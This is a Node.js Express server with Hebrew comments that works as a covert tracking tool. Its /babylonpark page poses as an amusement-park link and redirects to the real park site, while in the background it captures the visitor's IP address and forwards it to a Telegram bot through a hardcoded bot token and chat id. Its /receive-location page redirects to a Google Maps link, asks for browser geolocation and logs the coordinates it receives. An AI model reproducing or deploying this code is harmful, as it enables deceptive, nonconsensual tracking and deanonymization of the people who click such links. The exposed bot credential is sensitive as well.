const express = require('express');
const path = require('path');
const os = require('os'); // Import os module to get local IP
const app = express();
const PORT = 3000;
app.use(express.json());

// נתיב לתמונה
// const imagePath = path.join(__dirname, 'israelmap.jpeg');

// דף HTML שמכיל את התמונה ואת הקוד לביצוע בקשה
app.get('/babylonpark', (req, res) => {
    const htmlContent = `
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>בבילון פארק: חווית משחק לכל המשפחה</title>
        </head>
        <body>

            <script>
                // מבצע את המעבר מיידית
                window.location.href = 'https://babylonpark.co.il/';

                // שליחת הבקשה ל-report ברקע מבלי לחכות
                fetch('/report', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ timestamp: new Date().toISOString() })
                })
                .catch(error => {
                    console.error('Error reporting IP:', error);
                });
            </script>
        </body>
        </html>
    `;
    res.send(htmlContent);
});

// שליחת התמונה למשתמש
app.get('/image', (req, res) => {
    res.sendFile(imagePath);
});

// פונקציה לקבלת ה-IP המקומי של השרת
function getLocalIp() {
    const networkInterfaces = os.networkInterfaces();
    for (const interfaceName in networkInterfaces) {
        const addresses = networkInterfaces[interfaceName];
        for (const address of addresses) {
            if (address.family === 'IPv4' && !address.internal) {
                return address.address;
            }
        }
    }
    return 'Local IP not found'; // Default message if no local IP is found
}

// קליטת בקשה ודיווח IP עם שליחת הודעה לטלגרם
app.post('/report', (req, res) => {
    const userIP = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const localIP = getLocalIp(); // Get the local IP of the server
    console.log(`IP Reported: ${userIP}`);
    
    const botToken = '7215028644:AAHWvsP3pDjjxgvU2MOw7MFVyeROWvb6gpM';
    const chatId = '247751626';  // ייתכן שתצטרך לשים מזהה משתמש/קבוצה אם השם לא נתמך
    const message = `User IP Address: ${userIP}\nServer Local IP Address: ${localIP}`;
    
    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
    
    fetch(telegramUrl)
        .then(response => response.json())
        .then(data => {
            if (data.ok) {
                console.log('Message sent to Telegram successfully.');
                res.send({ message: 'IP logged and sent to Telegram.' });
            } else {
                console.error('Failed to send message to Telegram:', data);
                res.status(500).send({ error: 'Failed to send message to Telegram.' });
            }
        })
        .catch(error => {
            console.error('Error sending message to Telegram:', error);
            res.status(500).send({ error: 'Error sending message to Telegram.' });
        });
});

app.get('/receive-location', (req, res) => {
    const htmlContent = `
        <!DOCTYPE html>
        <html lang="he">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>מיקום נשלח בהצלחה</title>
        </head>
        <body>
            <script>
             // ביצוע רידיירקט לאפליקציה או אתר אחר
                window.location.href = 'https://maps.app.goo.gl/CbUb2RehYNPCqs2aA';  // שנה לכתובת שלך
                // בקשת המיקום הנוכחי מהדפדפן
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(function(position) {
                        const latitude = position.coords.latitude;
                        const longitude = position.coords.longitude;

                        // שליחת המיקום ב-POST לשרת
                        fetch('/reportLocation', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                latitude: latitude,
                                longitude: longitude,
                                timestamp: new Date().toISOString()
                            })
                        })
                        .catch(error => {
                            console.error('Error reporting location:', error);
                        });

                       
                    });
                } else {
                    alert("Geolocation is not supported by this browser.");
                }
            </script>
        </body>
        </html>
    `;

    res.send(htmlContent);
});

app.post('/reportLocation', (req, res) => {
    const { latitude, longitude, timestamp } = req.body;

    // בדוק אם כל הפרמטרים התקבלו
    if (!latitude || !longitude || !timestamp) {
        return res.status(400).send('Missing location or timestamp');
    }

    // לוג של המיקום
    console.log(`Received location: Latitude: ${latitude}, Longitude: ${longitude}, Timestamp: ${timestamp}`);
    const googleMapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
    console.log(`Received location in url: ${googleMapsUrl}`);
    // אפשר להוסיף פעולות נוספות עם המיקום, כמו שמירה בבסיס נתונים
    res.status(200).send('Location received');
});


// הפעלת השרת
app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
